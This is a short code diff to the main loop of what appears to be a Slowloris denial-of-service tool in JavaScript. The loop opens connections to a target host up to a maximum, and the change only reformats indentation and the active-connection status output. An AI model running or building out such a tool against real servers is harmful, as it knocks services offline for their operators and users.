@@ -62,19 +62,21 @@ const slowLoris = () => setInterval(() => {
   // Add another connection if we haven't reached
   // our max:
   if (connections.length < maxConnections) {
-      new Connection(host, port);
-      notify = true;
+    new Connection(host, port);
+    notify = true;
   }
 
   // Remove dead connections
   connections.filter(function (v) {
-      return v.state === "active";
+    return v.state === "active";
   });
 
   if (notify) {
-      console.log(
-          "Active connections: " + connections.length + " / " + maxConnections
-      );
+    process.stdout.clearLine();
+    process.stdout.cursorTo(0);
+    process.stdout.write(
+      "Active connections: " + connections.length + " / " + maxConnections
+    );
   }
 }, 500);
 
